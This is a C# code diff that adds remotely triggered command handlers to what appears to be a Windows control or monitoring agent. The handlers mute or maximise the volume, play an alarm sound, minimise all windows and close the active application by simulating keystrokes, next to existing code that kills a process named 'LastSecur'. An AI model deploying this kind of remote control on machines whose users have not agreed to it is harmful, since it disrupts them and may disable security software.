@@ -3,6 +3,10 @@ using MySql.Data.MySqlClient;
 using System.Net;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
+using NAudio.Wave;
+using NAudio.CoreAudioApi;
+using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace Check
 {
@@ -144,10 +148,117 @@ namespace Check
                     killpros("LastSecur");
                     UpdateCmdDB();
                     break;
+                case "7":
+                    OffSound();
+                    break;
+                case "9":
+                    MaxSound();
+                    break;
+                case "10":
+                    HideApps();
+                    break;
+                case "11":
+                    CloseApp();
+                    break;
+
+            }
+        }
+        [DllImport("user32.dll")]
+        static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);
+        static async void Play(string Path = "alarm.mp3", float Newval = 0.5f)
+        {
+            try
+            {
+                var enumerator = new MMDeviceEnumerator();
+                var device = enumerator.GetDefaultAudioEndpoint(DataFlow.Render, Role.Multimedia);
+                float volumeLevel = device.AudioEndpointVolume.MasterVolumeLevelScalar;
+                device.AudioEndpointVolume.MasterVolumeLevelScalar = Newval;
+                keybd_event((byte)Keys.VolumeUp, 0, 0, 0); // increase volume
+                using (var audioFile = new AudioFileReader(Path))
+                using (var outputDevice = new WaveOutEvent())
+                {
+                    outputDevice.Stop();
+                    outputDevice.Init(audioFile);
+                    // outputDevice.Volume = 1;
+                    outputDevice.Play();
+                    await Task.Delay(5);
+                    while (outputDevice.PlaybackState == PlaybackState.Playing)
+                    {
+                        //Console.WriteLine(outputDevice.GetPosition());
+                        await Task.Delay(1);
+                    }
+
+                }
+                device.AudioEndpointVolume.MasterVolumeLevelScalar = volumeLevel;
+
+            }
+            catch (Exception e)
+            {
+                Program.Mylog(e.ToString());
             }
         }
 
-       
+        static void HideApps()
+        {
+            try
+            {
+                keybd_event((byte)Keys.LWin, 0, 0, 0);
+                keybd_event((byte)Keys.D, 0, 0, 0);
+            }
+            catch (Exception e)
+            {
+                Program.Mylog(e.ToString());
+            }
+        }
+
+        static void CloseApp()
+        {
+            try
+            {
+                keybd_event((byte)Keys.LMenu, 0, 0, 0);
+                keybd_event((byte)Keys.F4, 0, 0, 0);
+            }
+            catch (Exception e)
+            {
+                Program.Mylog(e.ToString());
+            }
+        }
+
+
+        static void OffSound()
+        {
+            try
+            {
+                var enumerator = new MMDeviceEnumerator();
+                var device = enumerator.GetDefaultAudioEndpoint(DataFlow.Render, Role.Multimedia);
+                float volumeLevel = device.AudioEndpointVolume.MasterVolumeLevelScalar;
+                keybd_event((byte)Keys.VolumeDown, 0, 0, 0); // increase volume
+                keybd_event((byte)Keys.VolumeMute, 0, 0, 0); // increase volume
+                device.AudioEndpointVolume.MasterVolumeLevelScalar = 0;
+
+            }
+            catch (Exception e)
+            {
+                Program.Mylog(e.ToString());
+            }
+        }
+
+        static void MaxSound()
+        {
+            try
+            {
+                var enumerator = new MMDeviceEnumerator();
+                var device = enumerator.GetDefaultAudioEndpoint(DataFlow.Render, Role.Multimedia);
+                float volumeLevel = device.AudioEndpointVolume.MasterVolumeLevelScalar;
+                keybd_event((byte)Keys.VolumeUp, 0, 0, 0); // increase volume
+                device.AudioEndpointVolume.MasterVolumeLevelScalar = 1;
+                
+            }
+            catch (Exception e)
+            {
+                Program.Mylog(e.ToString());
+            }
+        }
 
         static void UpdateAll()
         {
